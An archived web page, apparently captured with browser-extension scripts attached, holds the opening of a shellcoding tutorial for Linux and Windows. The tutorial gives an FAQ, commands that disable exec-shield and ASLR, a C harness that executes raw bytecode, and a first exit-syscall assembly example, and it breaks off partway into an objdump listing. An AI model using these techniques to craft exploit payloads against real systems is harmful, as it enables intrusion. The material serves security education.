<html data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><script type="text/javascript">try {
(function injectPageScriptAPI(scriptName, shouldOverrideWebSocket, shouldOverrideWebRTC, isInjected) { 

    'use strict';

    /**
     * If script have been injected into a frame via contentWindow then we can simply take the copy of messageChannel left for us by parent document
     * Otherwise creates new message channel that sends a message to the content-script to check if request should be allowed or not.
     */
    var messageChannel = isInjected ? window[scriptName] : (function () {

        // Save original postMessage and addEventListener functions to prevent webpage from tampering both.
        var postMessage = window.postMessage;
        var addEventListener = window.addEventListener;

        // Current request ID (incremented every time we send a new message)
        var currentRequestId = 0;
        var requestsMap = {};

        /**
         * Handles messages sent from the content script back to the page script.
         *
         * @param event Event with necessary data
         */
        var onMessageReceived = function (event) {

            if (!event.data || !event.data.direction || event.data.direction !== "to-page-script@abu") {
                return;
            }

            var requestData = requestsMap[event.data.requestId];
            if (requestData) {
                var wrapper = requestData.wrapper;
                requestData.onResponseReceived(wrapper, event.data.block);
                delete requestsMap[event.data.requestId];
            }
        };

        /**
         * @param url                The URL to which wrapped object is willing to connect
         * @param requestType        Request type ( WEBSOCKET or WEBRTC)
         * @param wrapper            WebSocket wrapper instance
         * @param onResponseReceived Called when response is received
         */
        var sendMessage = function (url, requestType, wrapper, onResponseReceived) {

            if (currentRequestId === 0) {
                // Subscribe to response when this method is called for the first time
                addEventListener.call(window, "message", onMessageReceived, false);
            }

            var requestId = ++currentRequestId;
            requestsMap[requestId] = {
                wrapper: wrapper,
                onResponseReceived: onResponseReceived
            };

            var message = {
                requestId: requestId,
                direction: 'from-page-script@abu',
                elementUrl: url,
                documentUrl: document.URL,
                requestType: requestType
            };

            // Send a message to the background page to check if the request should be blocked
            postMessage.call(window, message, "*");
        };

        return {
            sendMessage: sendMessage
        };

    })();

    /*
     * In some case Chrome won't run content scripts inside frames.
     * So we have to intercept access to contentWindow/contentDocument and manually inject wrapper script into this context
     *
     * Based on: https://github.com/adblockplus/adblockpluschrome/commit/1aabfb3346dc0821c52dd9e97f7d61b8c99cd707
     */
    var injectedToString = Function.prototype.toString.bind(injectPageScriptAPI);

    var injectedFramesAdd;
    var injectedFramesHas;
    if (window.WeakSet instanceof Function) {
        var injectedFrames = new WeakSet();
        injectedFramesAdd = WeakSet.prototype.add.bind(injectedFrames);
        injectedFramesHas = WeakSet.prototype.has.bind(injectedFrames);
    } else {
        var frames = [];
        injectedFramesAdd = function (el) {
            if (frames.indexOf(el) < 0) {
                frames.push(el);
            }
        };
        injectedFramesHas = function (el) {
            return frames.indexOf(el) >= 0;
        };
    }

    /**
     * Injects wrapper's script into passed window
     * @param contentWindow Frame's content window
     */
    function injectPageScriptAPIInWindow(contentWindow) {
        try {
            if (contentWindow && !injectedFramesHas(contentWindow)) {
                injectedFramesAdd(contentWindow);
                contentWindow[scriptName] = messageChannel; // Left message channel for the injected script
                var args = "'" + scriptName + "', " + shouldOverrideWebSocket + ", " + shouldOverrideWebRTC + ", true";
                contentWindow.eval("(" + injectedToString() + ")(" + args + ");");
                delete contentWindow[scriptName];
            }
        } catch (e) {
        }
    }

    /**
     * Overrides access to contentWindow/contentDocument for the passed HTML element's interface (iframe, frame, object)
     * If the content of one of these objects is requested we will inject our wrapper script.
     * @param iface HTML element's interface
     */
    function overrideContentAccess(iface) {

        var contentWindowDescriptor = Object.getOwnPropertyDescriptor(iface.prototype, "contentWindow");
        var contentDocumentDescriptor = Object.getOwnPropertyDescriptor(iface.prototype, "contentDocument");

        // Apparently in HTMLObjectElement.prototype.contentWindow does not exist
        // in older versions of Chrome such as 42.
        if (!contentWindowDescriptor) {
            return;
        }

        var getContentWindow = Function.prototype.call.bind(contentWindowDescriptor.get);
        var getContentDocument = Function.prototype.call.bind(contentDocumentDescriptor.get);

        contentWindowDescriptor.get = function () {
            var contentWindow = getContentWindow(this);
            injectPageScriptAPIInWindow(contentWindow);
            return contentWindow;
        };
        contentDocumentDescriptor.get = function () {
            injectPageScriptAPIInWindow(getContentWindow(this));
            return getContentDocument(this);
        };

        Object.defineProperty(iface.prototype, "contentWindow", contentWindowDescriptor);
        Object.defineProperty(iface.prototype, "contentDocument", contentDocumentDescriptor);
    }

    var interfaces = [HTMLFrameElement, HTMLIFrameElement, HTMLObjectElement];
    for (var i = 0; i < interfaces.length; i++) {
        overrideContentAccess(interfaces[i]);
    }

    /**
     * Defines properties in destination object
     * @param src Source object
     * @param dest Destination object
     * @param properties Properties to copy
     */
    var copyProperties = function (src, dest, properties) {
        for (var i = 0; i < properties.length; i++) {
            var prop = properties[i];
            var descriptor = Object.getOwnPropertyDescriptor(src, prop);
            // Passed property may be undefined
            if (descriptor) {
                Object.defineProperty(dest, prop, descriptor);
            }
        }
    };

    /**
     * Check request by sending message to content script
     * @param url URL to block
     * @param type Request type
     * @param callback Result callback
     */
    var checkRequest = function (url, type, callback) {
        messageChannel.sendMessage(url, type, this, function (wrapper, blockConnection) {
            callback(blockConnection);
        });
    };

    /**
     * The function overrides window.WebSocket with our wrapper, that will check url with filters through messaging with content-script.
     *
     * IMPORTANT NOTE:
     * This function is first loaded as a content script. The only purpose of it is to call
     * the "toString" method and use resulting string as a text content for injected script.
     */
    var overrideWebSocket = function () { 

        if (!(window.WebSocket instanceof Function)) {
            return;
        }

        /**
         * WebSocket wrapper implementation.
         * https://github.com/AdguardTeam/AdguardBrowserExtension/issues/349
         *
         * Based on:
         * https://github.com/adblockplus/adblockpluschrome/commit/457a336ee55a433217c3ffe5d363e5c6980f26f4
         */

        /**
         * As far as possible we must track everything we use that could be sabotaged by the website later in order to circumvent us.
         */
        var RealWebSocket = WebSocket;
        var closeWebSocket = Function.prototype.call.bind(RealWebSocket.prototype.close);

        function WrappedWebSocket(url, protocols) {
            // Throw correct exceptions if the constructor is used improperly.
            if (!(this instanceof WrappedWebSocket)) {
                return RealWebSocket();
            }
            if (arguments.length < 1) {
                return new RealWebSocket();
            }

            var websocket = new RealWebSocket(url, protocols);

            // This is the key point: checking if this WS should be blocked or not
            // Don't forget that the type of 'websocket.url' is String, but 'url 'parameter might have another type.
            checkRequest(websocket.url, 'WEBSOCKET', function (blocked) {
                if (blocked) {
                    closeWebSocket(websocket);
                }
            });

            return websocket;
        }

        // https://github.com/AdguardTeam/AdguardBrowserExtension/issues/488
        WrappedWebSocket.prototype = RealWebSocket.prototype;
        window.WebSocket = WrappedWebSocket.bind();

        copyProperties(RealWebSocket, WebSocket, ["CONNECTING", "OPEN", "CLOSING", "CLOSED", "name", "prototype"]);

        RealWebSocket.prototype.constructor = WebSocket;

    };

    /**
     * The function overrides window.RTCPeerConnection with our wrapper, that will check ice servers URLs with filters through messaging with content-script.
     *
     * IMPORTANT NOTE:
     * This function is first loaded as a content script. The only purpose of it is to call
     * the "toString" method and use resulting string as a text content for injected script.
     */
    var overrideWebRTC = function () { 


        if (!(window.RTCPeerConnection instanceof Function) &&
            !(window.webkitRTCPeerConnection instanceof Function)) {
            return;
        }

        /**
         * RTCPeerConnection wrapper implementation.
         * https://github.com/AdguardTeam/AdguardBrowserExtension/issues/588
         *
         * Based on:
         * https://github.com/adblockplus/adblockpluschrome/commit/af0585137be19011eace1cf68bf61eed2e6db974
         *
         * Chromium webRequest API doesn't allow the blocking of WebRTC connections
         * https://bugs.chromium.org/p/chromium/issues/detail?id=707683
         */

        var RealRTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection;
        var closeRTCPeerConnection = Function.prototype.call.bind(RealRTCPeerConnection.prototype.close);

        var RealArray = Array;
        var RealString = String;
        var createObject = Object.create;
        var defineProperty = Object.defineProperty;

        /**
         * Convert passed url to string
         * @param url URL
         * @returns {string}
         */
        function urlToString(url) {
            if (typeof url !== "undefined") {
                return RealString(url);
            }
        }

        /**
         * Creates new immutable array from original with some transform function
         * @param original
         * @param transform
         * @returns {*}
         */
        function safeCopyArray(original, transform) {

            if (original === null || typeof original !== "object") {
                return original;
            }

            var immutable = RealArray(original.length);
            for (var i = 0; i < immutable.length; i++) {
                defineProperty(immutable, i, {
                    configurable: false, enumerable: false, writable: false,
                    value: transform(original[i])
                });
            }
            defineProperty(immutable, "length", {
                configurable: false, enumerable: false, writable: false,
                value: immutable.length
            });
            return immutable;
        }

        /**
         * Protect configuration from mutations
         * @param configuration RTCPeerConnection configuration object
         * @returns {*}
         */
        function protectConfiguration(configuration) {

            if (configuration === null || typeof configuration !== "object") {
                return configuration;
            }

            var iceServers = safeCopyArray(
                configuration.iceServers,
                function (iceServer) {

                    var url = iceServer.url;
                    var urls = iceServer.urls;

                    // RTCPeerConnection doesn't iterate through pseudo Arrays of urls.
                    if (typeof urls !== "undefined" && !(urls instanceof RealArray)) {
                        urls = [urls];
                    }

                    return createObject(iceServer, {
                        url: {
                            configurable: false, enumerable: false, writable: false,
                            value: urlToString(url)
                        },
                        urls: {
                            configurable: false, enumerable: false, writable: false,
                            value: safeCopyArray(urls, urlToString)
                        }
                    });
                }
            );

            return createObject(configuration, {
                iceServers: {
                    configurable: false, enumerable: false, writable: false,
                    value: iceServers
                }
            });
        }

        /**
         * Check WebRTC connection's URL and close if it's blocked by rule
         * @param connection Connection
         * @param url URL to check
         */
        function checkWebRTCRequest(connection, url) {
            checkRequest(url, 'WEBRTC', function (blocked) {
                if (blocked) {
                    try {
                        closeRTCPeerConnection(connection);
                    } catch (e) {
                        // Ignore exceptions
                    }
                }
            });
        }

        /**
         * Check each URL of ice server in configuration for blocking.
         *
         * @param connection RTCPeerConnection
         * @param configuration Configuration for RTCPeerConnection
         * https://developer.mozilla.org/en-US/docs/Web/API/RTCConfiguration
         */
        function checkConfiguration(connection, configuration) {

            if (!configuration || !configuration.iceServers) {
                return;
            }

            var iceServers = configuration.iceServers;
            for (var i = 0; i < iceServers.length; i++) {

                var iceServer = iceServers[i];
                if (!iceServer) {
                    continue;
                }

                if (iceServer.url) {
                    checkWebRTCRequest(connection, iceServer.url);
                }

                if (iceServer.urls) {
                    for (var j = 0; j < iceServer.urls.length; j++) {
                        checkWebRTCRequest(connection, iceServer.urls[j]);
                    }
                }
            }
        }

        /**
         * Overrides setConfiguration method
         * https://developer.mozilla.org/en-US/docs/Web/API/RTCPeerConnection/setConfiguration
         */
        if (RealRTCPeerConnection.prototype.setConfiguration) {

            var realSetConfiguration = Function.prototype.call.bind(RealRTCPeerConnection.prototype.setConfiguration);

            RealRTCPeerConnection.prototype.setConfiguration = function (configuration) {
                configuration = protectConfiguration(configuration);
                // Call the real method first, so that validates the configuration
                realSetConfiguration(this, configuration);
                checkConfiguration(this, configuration);
            };
        }

        function WrappedRTCPeerConnection(configuration, arg) {

            if (!(this instanceof WrappedRTCPeerConnection)) {
                return RealRTCPeerConnection();
            }

            configuration = protectConfiguration(configuration);

            /**
             * The old webkitRTCPeerConnection constructor takes an optional second argument and we must pass it.
             */
            var connection = new RealRTCPeerConnection(configuration, arg);
            checkConfiguration(connection, configuration);
            return connection;
        }

        WrappedRTCPeerConnection.prototype = RealRTCPeerConnection.prototype;

        var boundWrappedRTCPeerConnection = WrappedRTCPeerConnection.bind();
        copyProperties(RealRTCPeerConnection, boundWrappedRTCPeerConnection, ["caller", "generateCertificate", "name", "prototype"]);
        RealRTCPeerConnection.prototype.constructor = boundWrappedRTCPeerConnection;

        if ("RTCPeerConnection" in window) {
            window.RTCPeerConnection = boundWrappedRTCPeerConnection;
        }
        if ("webkitRTCPeerConnection" in window) {
            window.webkitRTCPeerConnection = boundWrappedRTCPeerConnection;
        }
    };

    if (shouldOverrideWebSocket) {
        overrideWebSocket();
    }

    if (shouldOverrideWebRTC) {
        overrideWebRTC();
    }
})('wrapper-script-10820947495943622', false, true);
} catch (ex) { console.error('Error executing AG js: ' + ex); }
(function () {
            var current = document.currentScript;
            var parent = current && current.parentNode;
            if (parent) {
                parent.removeChild(current);
            }
        })();</script><head><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, #bit-notification-bar-iframe, embed[type="application/pdf"] {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}
[data-darkreader-inline-stopcolor] {
  stop-color: var(--darkreader-inline-stopcolor) !important;
}</style><style class="darkreader darkreader--variables" media="screen">:root {
   --darkreader-neutral-background: #131516;
   --darkreader-neutral-text: #d8d4cf;
   --darkreader-selection-background: #004daa;
   --darkreader-selection-text: #e8e6e3;
}</style><style class="darkreader darkreader--root-vars" media="screen"></style><script class="darkreader darkreader--proxy">(function injectProxy() {
        document.dispatchEvent(new CustomEvent('__darkreader__inlineScriptsAllowed'));
        const addRuleDescriptor = Object.getOwnPropertyDescriptor(CSSStyleSheet.prototype, 'addRule');
        const insertRuleDescriptor = Object.getOwnPropertyDescriptor(CSSStyleSheet.prototype, 'insertRule');
        const deleteRuleDescriptor = Object.getOwnPropertyDescriptor(CSSStyleSheet.prototype, 'deleteRule');
        const removeRuleDescriptor = Object.getOwnPropertyDescriptor(CSSStyleSheet.prototype, 'removeRule');
        const shouldWrapDocStyleSheets = location.hostname.endsWith('pushbullet.com');
        const documentStyleSheetsDescriptor = shouldWrapDocStyleSheets ? Object.getOwnPropertyDescriptor(Document.prototype, 'styleSheets') : null;
        const cleanUp = () => {
            Object.defineProperty(CSSStyleSheet.prototype, 'addRule', addRuleDescriptor);
            Object.defineProperty(CSSStyleSheet.prototype, 'insertRule', insertRuleDescriptor);
            Object.defineProperty(CSSStyleSheet.prototype, 'deleteRule', deleteRuleDescriptor);
            Object.defineProperty(CSSStyleSheet.prototype, 'removeRule', removeRuleDescriptor);
            document.removeEventListener('__darkreader__cleanUp', cleanUp);
            document.removeEventListener('__darkreader__addUndefinedResolver', addUndefinedResolver);
            if (shouldWrapDocStyleSheets) {
                Object.defineProperty(Document.prototype, 'styleSheets', documentStyleSheetsDescriptor);
            }
        };
        const addUndefinedResolver = (e) => {
            customElements.whenDefined(e.detail.tag).then(() => {
                document.dispatchEvent(new CustomEvent('__darkreader__isDefined', { detail: { tag: e.detail.tag } }));
            });
        };
        document.addEventListener('__darkreader__cleanUp', cleanUp);
        document.addEventListener('__darkreader__addUndefinedResolver', addUndefinedResolver);
        const updateSheetEvent = new Event('__darkreader__updateSheet');
        function proxyAddRule(selector, style, index) {
            addRuleDescriptor.value.call(this, selector, style, index);
            if (this.ownerNode && !this.ownerNode.classList.contains('darkreader')) {
                this.ownerNode.dispatchEvent(updateSheetEvent);
            }
            return -1;
        }
        function proxyInsertRule(rule, index) {
            const returnValue = insertRuleDescriptor.value.call(this, rule, index);
            if (this.ownerNode && !this.ownerNode.classList.contains('darkreader')) {
                this.ownerNode.dispatchEvent(updateSheetEvent);
            }
            return returnValue;
        }
        function proxyDeleteRule(index) {
            deleteRuleDescriptor.value.call(this, index);
            if (this.ownerNode && !this.ownerNode.classList.contains('darkreader')) {
                this.ownerNode.dispatchEvent(updateSheetEvent);
            }
        }
        function proxyRemoveRule(index) {
            removeRuleDescriptor.value.call(this, index);
            if (this.ownerNode && !this.ownerNode.classList.contains('darkreader')) {
                this.ownerNode.dispatchEvent(updateSheetEvent);
            }
        }
        function proxyDocumentStyleSheets() {
            const docSheets = documentStyleSheetsDescriptor.get.call(this);
            const filtered = [...docSheets].filter((styleSheet) => {
                return !styleSheet.ownerNode.classList.contains('darkreader');
            });
            return Object.setPrototypeOf(filtered, StyleSheetList.prototype);
        }
        Object.defineProperty(CSSStyleSheet.prototype, 'addRule', Object.assign({}, addRuleDescriptor, { value: proxyAddRule }));
        Object.defineProperty(CSSStyleSheet.prototype, 'insertRule', Object.assign({}, insertRuleDescriptor, { value: proxyInsertRule }));
        Object.defineProperty(CSSStyleSheet.prototype, 'deleteRule', Object.assign({}, deleteRuleDescriptor, { value: proxyDeleteRule }));
        Object.defineProperty(CSSStyleSheet.prototype, 'removeRule', Object.assign({}, removeRuleDescriptor, { value: proxyRemoveRule }));
        if (shouldWrapDocStyleSheets) {
            Object.defineProperty(Document.prototype, 'styleSheets', Object.assign({}, documentStyleSheetsDescriptor, { get: proxyDocumentStyleSheets }));
        }
    })()</script><style class="darkreader darkreader--user-agent" media="screen">html {
    background-color: #181a1b !important;
}
html, body, input, textarea, select, button {
    background-color: #181a1b;
}
html, body, input, textarea, select, button {
    border-color: #736b5e;
    color: #e8e6e3;
}
a {
    color: #3391ff;
}
table {
    border-color: #545b5e;
}
::placeholder {
    color: #b2aba1;
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: #555b00 !important;
    color: #e8e6e3 !important;
}
::-webkit-scrollbar {
    background-color: #202324;
    color: #aba499;
}
::-webkit-scrollbar-thumb {
    background-color: #454a4d;
}
::-webkit-scrollbar-thumb:hover {
    background-color: #575e62;
}
::-webkit-scrollbar-thumb:active {
    background-color: #484e51;
}
::-webkit-scrollbar-corner {
    background-color: #181a1b;
}
* {
    scrollbar-color: #454a4d #202324;
}
::selection {
    background-color: #004daa !important;
    color: #e8e6e3 !important;
}
::-moz-selection {
    background-color: #004daa !important;
    color: #e8e6e3 !important;
}</style>
<meta http-equiv="Content-Language" content="en-us">
<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
<title>Shellcoding for Linux and Windows Tutorial</title>
<meta name="darkreader" content="ce8f9f6024097b8ea001524697efbb8e"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: #7b5300 !important;
    border-color: #d8b013 !important;
    color: #f3e8c8 !important;
}
::placeholder {
    opacity: 0.5 !important;
}
a[href="https://coinmarketcap.com/"] > svg[width="94"][height="16"] > path {
    fill: var(--darkreader-neutral-text) !important;
}
#edge-translate-panel-body {
    color: var(--darkreader-neutral-text) !important;
}</style></head>

<body>
<center><h2><p><font face="Courier New">Shellcoding for Linux and Windows Tutorial</font></p></h2>
<p><font face="Courier New">with example windows and linux shellcode</font></p>
<font face="Courier New">by <a href="http://vividmachines.com/about/">steve hanna</a><br><a href="http://vividmachines.com/">http://www.vividmachines.com/</a><br>
<a href="mailto:REMOVEMEsteve.c.hanna@gmail.comREMOVETHISTOO">steve./c/.hanna@gmail/.com</a><br>for premier computer security 
research check out: <a href="http://www.sigmil.org/">http://www.sigmil.org/</a><br></font></center>
<p align="left"><b><font size="5" face="Courier New">Table of Contents</font></b>
<br>
</p><pre>	
	<a href="#cl">Change Log</a>
	<a href="#faq">Frequently Asked Questions</a>
	<a href="#bi">Background Information</a>
	<a href="#rt">Required Tools</a>
	<a href="#ot">Optional Tools</a>
	<a href="#ls">Linux Shellcoding</a>
		- <a href="#linex1">Example 1 - Making a Quick Exit</a>
		- <a href="#linex2">Example 2 - Saying Hello</a>
		- <a href="#linex3">Example 3 - Spawning a Shell</a>
	<a href="#ws">Windows Shellcoding</a>
		- <a href="#win32ex1">Example 1 - Sleep is for the Weak</a>
		- <a href="#win32ex2">Example 2 - A Message to say "Hey"</a>
		- <a href="#win32ex3">Example 3 - Adding an Administrative Account</a>
	<a href="#as">Advanced Shellcoding Methods</a>
		- <a href="#ps">Printable Shellcode</a>
	<a href="#con">Conclusion</a>
	<a href="#fr">Further Reading/Attributions</a>
</pre>
<h2><font face="Courier New"><a name="cl">Change Log</a></font></h2>
<p>
<font face="Courier New">1. <b>Created</b> - <i> July 2004</i></font><br>
<font face="Courier New">2. <b>Advanced Shellcoding Methods Section Added</b> - <i> Sept 2005</i></font><br>
<font face="Courier New">3. <b>Updated Faq regarding stack randomization.</b> - <i> June 2007</i></font>
</p>
<h2><font face="Courier New"><a name="faq">Frequently Asked Questions</a></font></h2>
<p><font face="Courier New">1. <b>What is shellcoding?</b></font></p>
<p>    <font face="Courier New">&nbsp;&nbsp;&nbsp; In computer security, shellcoding in its most literal sense, means writing code 
that will return a remote shell when executed. The meaning of shellcode has evolved,
it now represents any byte code that will be inserted into an exploit to accomplish a
desired task. </font>
</p>
<p><font face="Courier New">2. <b>There are tons of shellcode repositories all around the internet, why should I write my own?</b></font></p>
<p>    <font face="Courier New">&nbsp;&nbsp;&nbsp;    Yes, you are correct, there are tons of repositories all around the internet for 
shellcoding. Namely, the <a href="http://www.metasploit.com/">metasploit project</a> seems to be the best. 
Writing an exploit can be difficult, what happens when all of the prewritten blocks of code
cease to work? You need to write your own! Hopefully this tutorial will give you a good head start.
</font>
</p>
<p><font face="Courier New">3. <b>What do I need to know before I begin?</b></font>
</p><p><font face="Courier New">&nbsp;&nbsp;&nbsp; A decent understanding of x86 assembly, C, and knowledge of the
Linux and Windows operating systems. </font></p>
<p><font face="Courier New">4. <b>What are the differences between windows shellcode and Linux shellcode?</b></font></p>
<p><font face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; Linux, unlike windows, provides a direct way to interface with the kernel through
the <b>int 0x80</b> interface. A complete listing of the Linux syscall table can be found <a href="http://world.std.com/~slanning/asm/syscall_list.html">here</a>.
Windows on the other hand, does not have a direct kernel interface. The system must be interfaced by loading the
address of the function that needs to be executed from a DLL (Dynamic Link Library). The key difference between
the two is the fact that the address of the functions found in windows will vary from OS version to OS version
while the <b>int 0x80</b> syscall numbers will remain constant. Windows 
programmers did this so that they could make any change needed to the 
kernel without any hassle; Linux on the contrary has fixed numbering 
system for all kernel level functions, and if they were to change, there
 would be a million angry programmers (and a lot of broken code). </font></p>
<p><font face="Courier New">5. <b>So, what about windows? How do I find 
the addresses of my needed DLL functions? Don't these addresses change 
with every service pack upgrade?</b></font></p>
<p><font face="Courier New">&nbsp;&nbsp;&nbsp;&nbsp; There are 
multitudes of ways to find the addresses of the functions that you need 
to use in your shellcode. There are two methods for addressing 
functions; you can find the desired function at runtime or use hard 
coded addresses. This tutorial will <i>mostly</i> discuss the hard coded
 method. The only DLL that is guaranteed to be mapped into the 
shellcode's address space is kernel32.dll. This DLL will hold 
LoadLibrary and GetProcAddress, the two functions needed to obtain any 
functions address that can be mapped into the exploits process space. 
There is a problem with this method though, the address offsets will 
change with every new release of Windows (service packs, patches etc.). 
So, if you use this method your shellcode will ONLY work for a specific 
version of Windows. Further dynamic addressing will be referenced at the
 end of the paper in the Further Reading section.</font></p>
<p><font face="Courier New">6. <b>What's the hype with making sure the shellcode won't have any NULL bytes in it? Normal programs have lots of NULL bytes!</b></font></p>
<p><font face="Courier New">&nbsp;&nbsp;&nbsp; Well this isn't a normal 
program! The main problem arises in the fact that when the exploit is 
inserted it will be a string.
As we all know, strings are terminated with a NULL byte (C style strings
 anyhow). If we have a NULL byte in our shellcode things won't work 
correctly. </font></p>
<p><font face="Courier New">7. <b>Why does my shellcode program crash when I run it?</b></font></p>
<p><font face="Courier New">&nbsp;&nbsp;&nbsp; Well, in most shellcode 
the assembly contained within has some sort of self modifying qualities.
 Since we are working in protected mode operating systems the .code 
segment of the executable image is read only. That is why the shell 
program needs to copy itself to the stack before attempting execution.</font></p>
<p><font face="Courier New">8. <b>Can I contact you?</b></font></p>
<p><font face="Courier New">&nbsp;&nbsp;&nbsp; Sure, just email <a href="mailto:shanna@uiuc.edu">shanna@uiuc.edu</a>. Feel free to ask questions, comments, or correct something that is wrong in this tutorial.</font></p>
<p><font face="Courier New">9. <b>Why did you use intel syntax, UGHHH?!</b></font></p>
<p><font face="Courier New">&nbsp;&nbsp;&nbsp; I don't know! I honestly 
prefer at&amp;t syntax, but for some reason I felt compelled to do this 
in intel syntax. I am really sorry!</font></p>
<p><font face="Courier New">10. <b>Why does my program keep segfaulting? Yes, I read item 7 above, but it STILL crashes.</b></font></p>
<p><font face="Courier New">&nbsp;&nbsp;&nbsp; You probably are using an
 operating system with randomized stack and address space and possibly a
 protection mechanism that prevents you from executing code on the 
stack. All Linux based operating systems are not the same, so I present a
 solution for Fedora that should adapt easily.<br>
</font></p><pre><font face="Courier New">echo 0 &gt; /proc/sys/kernel/exec-shield   #turn it off
echo 0 &gt; /proc/sys/kernel/randomize_va_space #turn it off

echo 1 &gt; /proc/sys/kernel/exec-shield   #turn it on
echo 1 &gt; /proc/sys/kernel/randomize_va_space #turn it on
</font></pre><font face="Courier New">



</font><p></p>
<p>&nbsp;</p>
<h2><font face="Courier New"><a name="bi">Background Information</a></font></h2>

<ul><li><font face="Courier New">EAX, EBX, ECX, and EDX are all 32-bit General Purpose Registers on the x86 platform.</font></li><li>
<font face="Courier New">AH, BH, CH and DH access the upper 16-bits of the GPRs.</font></li><li><font face="Courier New">AL, BL, CL, and DL access the lower 8-bits of the GPRs.</font></li>
<li><font face="Courier New">ESI and EDI are used when making Linux syscalls.</font></li><li><font face="Courier New">Syscalls with 6 arguments or less are passed via the GPRs.</font></li><li><font face="Courier New">XOR EAX, EAX is a great way to zero out a register (while staying away from the nefarious NULL byte!)</font></li><li><font face="Courier New">In Windows, all function arguments are passed on the stack according to their calling convention.</font></li></ul><p>&nbsp;</p><h2>
<font face="Courier New"><a name="rt">Required Tools</a></font></h2>
<ul><li><font face="Courier New">gcc</font></li><li><font face="Courier New">ld</font></li><li><font face="Courier New">nasm</font></li><li><font face="Courier New">objdump</font></li></ul><p>&nbsp;</p><h2>
<font face="Courier New"><a name="ot">Optional Tools</a></font></h2>
<ul><li><font face="Courier New"><a href="https://www.vividmachines.com/shellcode/odfhex.cpp">odfhex.c </a>- a utility created by me to extract the shellcode from "objdump -d" and turn it into escaped hex code (very useful!).</font></li><li><font face="Courier New"><a href="https://www.vividmachines.com/shellcode/arwin.c">arwin.c</a> - a utility created by me to find the absolute addresses of windows functions within a specified DLL.</font></li><li><font face="Courier New"><a href="https://www.vividmachines.com/shellcode/shellcodetest.c">shellcodetest.c</a> - this is just a copy of the c code found&nbsp; below. it is a small skeleton program to test shellcode.</font></li><li><font face="Courier New"><a href="https://www.vividmachines.com/shellcode/exit.asm">exit.asm</a> <a href="https://www.vividmachines.com/shellcode/hello.asm">hello.asm</a> <a href="https://www.vividmachines.com/shellcode/msgbox.asm">msgbox.asm </a><a href="https://www.vividmachines.com/shellcode/shellex.asm">shellex.asm</a> <a href="https://www.vividmachines.com/shellcode/sleep.asm">sleep.asm</a> <a href="https://www.vividmachines.com/shellcode/adduser.asm">adduser.asm</a> - the source code found in this document (the win32 shellcode was written with Windows XP SP1).</font></li><li>&nbsp;</li></ul>

<h2><font face="Courier New"><a name="ls">Linux Shellcoding</a></font></h2>

<p>
	<font face="Courier New">When testing shellcode, it is nice to just plop it into a program and let it run. The C program below
will be used to test all of our code.
	</font>
</p>
<code>
<hr>
<font size="2" face="Courier New"><i>/*shellcodetest.c*/</i> </font><pre><font size="2" face="Courier New">char code[] = "bytecode will go here!";
int main(int argc, char **argv)
{
&nbsp; int (*func)();
&nbsp; func = (int (*)()) code;
&nbsp; (int)(*func)();
}</font></pre>
</code>
<hr>
<font face="Courier New"><br>
</font><h4><font face="Courier New"><a name="linex1">Example 1 - Making a Quick Exit</a></font></h4>
<p><font face="Courier New">&nbsp;&nbsp;&nbsp; The easiest way to begin would be to demonstrate the exit syscall due to it's simplicity. Here is some simple
asm code to call exit. Notice the al and XOR trick to ensure that no NULL bytes will get into our code. </font></p>
<hr>
<pre><font face="Courier New">;<i>exit.asm</i>
[SECTION .text]
global _start
_start:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor eax, eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;exit is syscall 1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al, 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;exit is syscall 1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor ebx,ebx&nbsp;&nbsp;&nbsp;&nbsp; ;zero out ebx
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80

</font>
</pre>
<hr>
<pre><font face="Courier New">Take the following steps to compile and extract the byte code.
steve hanna@1337b0x:~$ <b>nasm -f elf exit.asm</b>
steve hanna@1337b0x:~$ <b>ld -o exiter exit.o</b>
steve hanna@1337b0x:~$ <b>objdump -d exiter</b>

exiter:&nbsp;&nbsp;&nbsp;&nbsp; file format elf32-i386

Disassembly of section .text:

08048080 &lt;_start&gt;:
&nbsp;8048080:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <b>b0 01</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov&nbsp;&nbsp;&nbsp; $0x1,%al
